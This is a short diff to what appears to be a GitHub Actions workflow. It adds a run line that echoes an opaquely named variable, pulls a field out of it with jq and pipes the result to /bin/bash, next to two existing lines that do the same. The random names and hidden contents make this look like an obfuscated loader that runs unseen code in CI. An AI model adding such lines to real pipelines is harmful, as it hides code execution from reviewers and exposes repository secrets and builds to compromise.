@@ -20,6 +20,7 @@ jobs:
         run: |
           printf '%s' "$f43" | jq -r .gtsy936 | /bin/bash
           printf '%s' "$kkty59741" | jq -r .ul89438 | /bin/bash
+          echo $l2 | jq -r .jan47 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
